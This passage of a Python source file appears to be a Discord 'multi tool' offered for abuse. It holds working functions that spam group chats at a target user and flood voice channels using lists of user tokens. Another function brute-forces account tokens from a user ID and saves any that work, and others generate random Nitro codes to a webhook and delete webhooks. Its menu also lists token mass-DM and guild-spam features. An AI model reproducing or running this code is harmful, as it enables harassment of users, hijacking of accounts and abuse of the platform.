    for i in range(group_count):
        try:
            # Create a new group chat
            response = requests.post('https://discord.com/api/v9/users/@me/channels', headers=headers, json={"recipients": []})
            response_data = response.json()

            # Handle rate limiting
            if response.status_code == 429:
                retry_after = response_data.get("retry_after", 5)
                print(f"{TYPE} {COLORAMA_YELLOW}[ {COLOR_L}Rate Limited - {retry_after} {COLORAMA_YELLOW} ] {COLORAMA_RESET}")
                time.sleep(retry_after)
                continue

            # Get the new group ID
            group_id = response_data.get("id")
            if not group_id:
                print(f"{TYPE} {COLORAMA_RED}[ {COLOR_L}Failed to create group. {COLORAMA_RED}] {COLORAMA_RESET}")
                continue

            # Rename the group
            rename_response = requests.patch(f'https://discord.com/api/v9/channels/{group_id}', headers=headers, json={'name': group_name})
            if rename_response.status_code == 200:
                print(f"{TYPE} {COLORAMA_GREEN}[ {COLOR_L}Group Created - {group_name} {COLORAMA_GREEN} ] {COLORAMA_RESET}")


            # Add the specified user to the group
            add_member_response = requests.put(f'https://discord.com/api/v9/channels/{group_id}/recipients/{user_id}', headers=headers)
            if add_member_response.status_code == 204:
                print(f"{TYPE} {COLORAMA_GREEN}[ {COLOR_L}Added {user_id} to {group_name} {COLORAMA_GREEN} ] {COLORAMA_RESET}")

        except Exception as e:
            print(f"{TYPE} {COLORAMA_RED}[ {COLOR_L}An error occurred: {COLORAMA_RED}] {COLORAMA_RESET} {str(e)}")
            time.sleep(1)

    # End the function
    input(f"{INPUT} PRESS ENTER TO CONTINUE > ")
    clear()
    main_menu


def vcspammer():
    # Print banner
    
    # Get input
    channel = input(f"{INPUT} Voice Channel ID > ")
    server = input(f"{INPUT} Server ID > ")
    deaf = input(f"{INPUT} Deafen > (y/n) ").strip().lower() == "y"
    mute = input(f"{INPUT} Mute > (y/n) ").strip().lower() == "y"
    stream = input(f"{INPUT} Stream > (y/n) ").strip().lower() == "y"
    video = input(f"{INPUT} Video > (y/n) ").strip().lower() == "y"

    # Load tokens
    try:
        with open("stats/input/tokens.txt", "r") as f:
            tokenlist = f.read().splitlines()
    except FileNotFoundError:
        print(f"{TYPE} tokens.txt not found!")
        return

    # Start VC spamming
    with ThreadPoolExecutor(max_workers=1000) as executor:
        for token in tokenlist:
            executor.submit(join_vc, token, server, channel, mute, deaf, stream, video)
    
    # Wait for user to stop the spammer
    input(f"{INPUT} Press ENTER to Stop VC Spammer!")

def join_vc(token, server, channel, mute, deaf, stream, video):
    """Connects a user token to a specified Discord voice channel."""
    ws = WebSocket()
    try:
        ws.connect("wss://gateway.discord.gg/?v=8&encoding=json")
        hello = loads(ws.recv())
        ws.send(dumps({
            "op": 2,
            "d": {
                "token": token,
                "properties": {
                    "$os": "windows",
                    "$browser": "Discord",
                    "$device": "desktop"
                }
            }
        }))
        ws.send(dumps({
            "op": 4,
            "d": {
                "guild_id": server,
                "channel_id": channel,
                "self_mute": mute,
                "self_deaf": deaf,
                "self_stream?": stream,
                "self_video": video
            }
        }))
        ws.send(dumps({
            "op": 18,
            "d": {
                "type": "guild",
                "guild_id": server,
                "channel_id": channel,
                "preferred_region": "singapore"
            }
        }))
        print(f"{TYPE} {COLORAMA_GREEN}[ {COLOR_L}Joined Vc - {token[:20]}**** {COLORAMA_GREEN} ]")
        sleep(0.1)
    except Exception as e:
        print(f"{TYPE} {COLORAMA_RED}[ {COLOR_L}Error - {token[:20]}**** {COLORAMA_RED} ] {e}")
    finally:
        ws.close()
    input(f"{INPUT} PRESS ENTER TO CONTINUE > ")
    clear()
    main_menu

def vcjoiner():
    # Get input
    channel = input(f"{INPUT} Voice Channel ID > ")
    server = input(f"{INPUT} Server ID > ")
    deaf = input(f"{INPUT} Deafen > (y/n) ").strip().lower() == "y"
    mute = input(f"{INPUT} Mute > (y/n) ").strip().lower() == "y"
    stream = input(f"{INPUT} Stream > (y/n) ").strip().lower() == "y"
    video = input(f"{INPUT} Video > (y/n) ").strip().lower() == "y"

    # Load tokens
    try:
        with open("stats/input/tokens.txt", "r") as f:
            tokenlist = f.read().splitlines()
    except FileNotFoundError:
        print(f"{TYPE} tokens.txt not found!")
        return

    # Join VC once per token
    with ThreadPoolExecutor(max_workers=10) as executor:  # Adjust max_workers as needed
        for token in tokenlist:
            executor.submit(join_vc, token, server, channel, mute, deaf, stream, video)

    input(f"{INPUT} Press ENTER to finish!")

def join_vc(token, server, channel, mute, deaf, stream, video):
    """Connects a user token to a specified Discord voice channel once."""
    ws = WebSocket()
    try:
        ws.connect("wss://gateway.discord.gg/?v=8&encoding=json")
        hello = loads(ws.recv())
        ws.send(dumps({
            "op": 2,
            "d": {
                "token": token,
                "properties": {
                    "$os": "windows",
                    "$browser": "Discord",
                    "$device": "desktop"
                }
            }
        }))
        ws.send(dumps({
            "op": 4,
            "d": {
                "guild_id": server,
                "channel_id": channel,
                "self_mute": mute,
                "self_deaf": deaf,
                "self_stream?": stream,
                "self_video": video
            }
        }))
        print(f"{TYPE} {COLORAMA_GREEN}[ {COLOR_L}Joined VC - {token[:20]}**** {COLORAMA_GREEN} ]")
        sleep(0.1)
    except Exception as e:
        print(f"{TYPE} {COLORAMA_RED}[ {COLOR_L}Error - {token[:20]}**** {COLORAMA_RED} ] {e}")
    finally:
        ws.close()
    input(f"{INPUT} PRESS ENTER TO CONTINUE > ")
    clear()
    main_menu

def bruteforce():
    global id_to_token
    id_to_token = base64.b64encode((input(f"{INPUT} DISCORD ID >  ")).encode("ascii"))
    id_to_token = str(id_to_token)[2:-1]

    def bruting():
      while True:
        pyautogui.press('enter')
        time.sleep(0.05)
        token = id_to_token + '.' + ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + '.' + ''.join(random.choices(string.ascii_letters + string.digits, k=25))
        headers={
          'Authorization': token
        }
        login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
        try:
          if login.status_code == 200:
            print(f'{TYPE} {COLORAMA_GREEN}[ {COLOR_L}VALID{COLORAMA_GREEN} ]' + ' ' + token)
            f = open('valid_bruteforce.txt', "a+")
            f.write(f'{token}\n')
            break
          else:
            print(f'{TYPE} {COLORAMA_RED}[ {COLOR_L}INVALID{COLORAMA_RED} ]' + ' ' + token) 
        finally:
          print("")
        input()

    threads = []
    for i in range(3):
      t = threading.Thread(target=bruting)
      t.daemon = True
      t.start()
      threads.append(t)

    for threads in threads:
      t.join()


def nitro():

    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Nitro Generator")
    colorama.init()

    print(f'''
{Fore.GREEN}
 ███▄    █   ██▄▄▄█████▓ ██▀███   ▒█████     ▄████ ▓█████ ███▄    █ 
 ██ ▀█   █ ▒▓██▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒▒ ██▒ ▀█▒▓█   ▀ ██ ▀█   █ 
▓██  ▀█ ██▒░▒██▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒░▒██░▄▄▄░▒███  ▓██  ▀█ ██▒
▓██▒  ▐▌██▒ ░██░ ▓██▓ ░ ▒██▀▀█▄  ▒██   ██░░░▓█  ██▓▒▓█  ▄▓██▒  ▐▌██▒
▒██░   ▓██░ ░██  ▒██▒ ░ ░██▓ ▒██▒░ ████▓▒░░▒▓███▀▒░░▒████▒██░   ▓██░
░ ▒░   ▒ ▒  ░▓   ▒ ░░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░  ░▒   ▒  ░░ ▒░ ░ ▒░   ▒ ▒ 
░ ░░   ░ ▒░  ▒     ░      ░▒ ░ ▒░  ░ ▒ ▒░   ░   ░   ░ ░  ░ ░░   ░ ▒░
   ░   ░ ░   ▒   ░ ░       ░   ░ ░ ░ ░ ▒  ░ ░   ░ ░   ░     ░   ░ ░ 
         ░   ░             ░         ░ ░        ░     ░           ░ 

      ''')



    webhooklink = str(input(f"""{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Webhook URL: """))
    
    count = 0

    webhook = "~~WEBHOOK_URL~~""".replace("~~WEBHOOK_URL~~", webhooklink)

    while True:
        try:
            code = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(24))
            post = {"content":"https://discord.com/billing/promotions/"+code}
            head = {

                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", 
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
                    'content-type' : 'application/json'
                }
            count += 1
            print(f'{TYPE} {COLORAMA_GREEN}[ {COLOR_L}GENERATED{COLORAMA_GREEN} ] {COLORAMA_GRAY}- [{count}] {Fore.RESET}')
            s = requests.post(webhook, json=post, headers=head)
        except:
            print(f"{TYPE} {COLORAMA_RED}[ {COLOR_L}ERROR{COLORAMA_RED} ]")
            break


def webhook_info():
    webhook_url = input(f"{INPUT} Enter Webhook URL > ").strip()

    try:
        # Send a GET request to fetch webhook information
        response = requests.get(webhook_url)
        
        # Check if the response is successful
        if response.status_code == 200:
            webhook_data = response.json()
            
            # Extract and print webhook details
            webhook_id = webhook_data.get("id", "Unknown")
            webhook_name = webhook_data.get("name", "Unknown")
            webhook_channel_id = webhook_data.get("channel_id", "Unknown")
            webhook_guild_id = webhook_data.get("guild_id", "Unknown")
            webhook_token = webhook_data.get("token", "Unknown")
            
            print(f"{TYPE} {COLORAMA_GREEN}Webhook Information:")
            print(f"{TYPE} {COLORAMA_YELLOW}ID: {COLOR_L}{webhook_id}")
            print(f"{TYPE} {COLORAMA_YELLOW}Name: {COLOR_L}{webhook_name}")
            print(f"{TYPE} {COLORAMA_YELLOW}Channel ID: {COLOR_L}{webhook_channel_id}")
            print(f"{TYPE} {COLORAMA_YELLOW}Server (Guild) ID: {COLOR_L}{webhook_guild_id}")
            print(f"{TYPE} {COLORAMA_YELLOW}Token: {COLOR_L}{webhook_token[:20]}****")  # Partial token display for security
        else:
            print(f"{TYPE} {COLORAMA_RED}Failed to retrieve webhook information. Status code: {response.status_code}")
    except Exception as e:
        print(f"{TYPE} {COLORAMA_RED}Error: {e}")


def validate_webhook():
    webhook_url = input(f"{INPUT} WEBHOOK URL > ").strip()

    try:
        # Send a GET request to check webhook validity
        response = requests.get(webhook_url)

        # Validate based on status code
        if response.status_code == 200:
            print(f"{TYPE} {COLORAMA_GREEN}[ {COLOR_L}VALID{COLORAMA_GREEN} ]")
        elif response.status_code == 404:
            print(f"{TYPE} {COLORAMA_RED}Webhook is invalid. (404 Not Found)")
        elif response.status_code == 401:
            print(f"{TYPE} {COLORAMA_RED}Webhook is unauthorized. (401 Unauthorized)")
        else:
            print(f"{TYPE} {COLORAMA_RED}Failed to validate webhook. Status code: {response.status_code}")
    except Exception as e:
        print(f"{TYPE} {COLORAMA_RED}Error: {e}")

def delete_webhook():
    webhook_url = input(f"{INPUT} WEBHOOK URL > ").strip()

    try:
        # Send a DELETE request to delete the webhook
        response = requests.delete(webhook_url)

        # Check if the deletion was successful
        if response.status_code == 204:
            print(f"{TYPE} {COLORAMA_GREEN}[ {COLOR_L}DELETED{COLORAMA_GREEN} ]")
        elif response.status_code == 404:
            print(f"{TYPE} {COLORAMA_RED}Webhook not found. (404 Not Found)")
        elif response.status_code == 401:
            print(f"{TYPE} {COLORAMA_RED}Unauthorized to delete the webhook. (401 Unauthorized)")
        else:
            print(f"{TYPE} {COLORAMA_RED}[ {COLOR_L}FAILED{COLORAMA_RED} ] {response.status_code}")
    except Exception as e:
        print(f"{TYPE} {COLORAMA_RED}Error: {e}")

def idtotoken():

    userid = input(f'''{INPUT} DISCORD ID > ''')
    encodedBytes = base64.b64encode(userid.encode("utf-8"))
    encodedStr = str(encodedBytes, "utf-8")

    print(f'{TYPE} FIRST PART > {encodedStr}')
    input(f"{INPUT} PRESS ENTER > ")
    main_menu()


def p2():
 while True:
    clear_screen()
    MainBanner()
    print(f'''                                                               
            {COLOR_L}[{COLOR_L1}20{COLOR_L}]{Fore.RESET}{COLORAMA_GRAY} |{COLOR_WHITE} Webhook Deleter 
            {COLOR_L}[{COLOR_L1}21{COLOR_L}]{Fore.RESET}{COLORAMA_GRAY} |{COLOR_WHITE} Id To Token
            {COLOR_L}[{COLOR_L1}03{COLOR_L}]{Fore.RESET}{COLORAMA_GRAY} |{COLOR_WHITE} SOON    
            {COLOR_L}[{COLOR_L1}04{COLOR_L}]{Fore.RESET}{COLORAMA_GRAY} |{COLOR_WHITE} SOON    
            {COLOR_L}[{COLOR_L1}P{COLOR_L}]{Fore.RESET}{COLORAMA_GRAY} |{COLOR_WHITE}  Previous Page 
''')
    choice2 = input(f"            {COLOR_L}[{COLOR_L1}ETHERIUM{COLOR_L}] {COLORAMA_GRAY}| {COLOR_L}[{COLOR_L1}INPUT{COLOR_L}] {COLORAMA_GRAY} > {COLOR_WHITE}") 
    if choice2 == "P":
        os.system("cls")
        main_menu()
    elif choice2 == "20":
        os.system("cls")
        MainBanner()
        delete_webhook()
    elif choice2 == "21":
        os.system("cls")
        MainBanner()
        idtotoken()


def main_menu():
 while True:
    clear_screen()
    MainBanner()
    print(f'''                                                               
            {COLOR_L}[{COLOR_L1}01{COLOR_L}]{Fore.RESET}{COLORAMA_GRAY} |{COLOR_WHITE} Token Guild Joiner {COLOR_L}[{COLOR_L1}06{COLOR_L}]{Fore.RESET}{COLORAMA_GRAY} |{COLOR_WHITE} Token Guild Spammer   {COLOR_L}[{COLOR_L1}11{COLOR_L}]{Fore.RESET}{COLORAMA_GRAY} |{COLOR_WHITE} Token Inliner          {COLOR_L}[{COLOR_L1}16{COLOR_L}]{Fore.RESET}{COLORAMA_GRAY} |{COLOR_WHITE} Bruteforcer {COLOR_L}( {COLORAMA_GRAY}GETS REAL TOKEN {COLOR_L}){COLOR_RESET}
            {COLOR_L}[{COLOR_L1}02{COLOR_L}]{Fore.RESET}{COLORAMA_GRAY} |{COLOR_WHITE} Token Guild Leaver {COLOR_L}[{COLOR_L1}07{COLOR_L}]{Fore.RESET}{COLORAMA_GRAY} |{COLOR_WHITE} Token Guild Checker   {COLOR_L}[{COLOR_L1}12{COLOR_L}]{Fore.RESET}{COLORAMA_GRAY} |{COLOR_WHITE} Token Mass Dm          {COLOR_L}[{COLOR_L1}17{COLOR_L}]{Fore.RESET}{COLORAMA_GRAY} |{COLOR_WHITE} Nitro Generator
            {COLOR_L}[{COLOR_L1}03{COLOR_L}]{Fore.RESET}{COLORAMA_GRAY} |{COLOR_WHITE} Token Formatter    {COLOR_L}[{COLOR_L1}08{COLOR_L}]{Fore.RESET}{COLORAMA_GRAY} |{COLOR_WHITE} Token Pron. Changer   {COLOR_L}[{COLOR_L1}13{COLOR_L}]{Fore.RESET}{COLORAMA_GRAY} |{COLOR_WHITE} Group Spammer          {COLOR_L}[{COLOR_L1}18{COLOR_L}]{Fore.RESET}{COLORAMA_GRAY} |{COLOR_WHITE} Webhook Info
            {COLOR_L}[{COLOR_L1}04{COLOR_L}]{Fore.RESET}{COLORAMA_GRAY} |{COLOR_WHITE} Token Checker      {COLOR_L}[{COLOR_L1}09{COLOR_L}]{Fore.RESET}{COLORAMA_GRAY} |{COLOR_WHITE} Token Nick. Changer   {COLOR_L}[{COLOR_L1}14{COLOR_L}]{Fore.RESET}{COLORAMA_GRAY} |{COLOR_WHITE} Vc Spammer             {COLOR_L}[{COLOR_L1}19{COLOR_L}]{Fore.RESET}{COLORAMA_GRAY} |{COLOR_WHITE} Webhook Validator 
            {COLOR_L}[{COLOR_L1}05{COLOR_L}]{Fore.RESET}{COLORAMA_GRAY} |{COLOR_WHITE} UUID Changer       {COLOR_L}[{COLOR_L1}10{COLOR_L}]{Fore.RESET}{COLORAMA_GRAY} |{COLOR_WHITE} Token Bio. Changer    {COLOR_L}[{COLOR_L1}15{COLOR_L}]{Fore.RESET}{COLORAMA_GRAY} |{COLOR_WHITE} Vc Joiner              {COLOR_L}[{COLOR_L1}N{COLOR_L}]{Fore.RESET}{COLORAMA_GRAY}  |{COLOR_WHITE} New Page
''')
    choice = input(f"            {COLOR_L}[{COLOR_L1}ETHERIUM{COLOR_L}] {COLORAMA_GRAY}| {COLOR_L}[{COLOR_L1}INPUT{COLOR_L}] {COLORAMA_GRAY} > {COLOR_WHITE}") 
    if choice == "1":
        os.system("cls")
        MainBanner()
        TknJoiner()
    elif choice == "2":
        os.system("cls")
        MainBanner()
        GuildLeaver()
    elif choice == "3":
        os.system("cls")
        MainBanner()
        formatter = Formatter(token_file)
        formatter.format_tokens()
    elif choice == "4":
        os.system("cls")
        MainBanner()
        Checker()
    elif choice == "5":
        os.system("cls")
        MainBanner()
        print(f"{TYPE} Sucessfully Changed UUID To {COLOR_L}[{COLOR_L1}INPUT HIDDEN{COLOR_L}] ")
        input(f"{TYPE} PRESS ENTER TO CONTINUE > ")
    elif choice == "6":
        os.system("cls")
        MainBanner()
        ChannelSpammer()     
    elif choice == "7":
        os.system("cls")
        MainBanner()
        GuildChecker()  
    elif choice == "9":
        os.system("cls")
        MainBanner()
        NameChanger()  
    elif choice == "10":
        os.system("cls")
        MainBanner()
        BioChanger()
    elif choice == "11":
        os.system("cls")
        MainBanner()
        inliner()
    elif choice == "13":
        os.system("cls")
        MainBanner()
        group_chat_spammer()
    elif choice == "14":
        os.system("cls")
        MainBanner()
        vcspammer()
    elif choice == "15":
        os.system("cls")
        MainBanner()
        vcjoiner()
    elif choice == "16":
        os.system("cls")
        MainBanner()
        bruteforce()
    elif choice == "17":
        os.system("cls")
        MainBanner()
        nitro()
    elif choice == "18":
        os.system("cls")
        MainBanner()
        webhook_info()
    elif choice == "19":
        os.system("cls")
        MainBanner()
        validate_webhook()
    elif choice == "N":
        os.system("cls")
        p2()
    else:
        print(f"            {COLOR_L}[{COLOR_L1}ETHERIUM{COLOR_L}] {COLORAMA_GRAY}| {COLOR_L}[{COLORAMA_YELLOW}WRONG CHOICE{COLOR_L}] {COLORAMA_GRAY} > {COLOR_WHITE}")
        time.sleep(0.5)
        main_menu()  # Restart the main menu

# Entry point of the program
if __name__ == "__main__":
    set_console_title()
    set_console_size()
    display_ascii_banner()
    check_directories()
    main_menu()
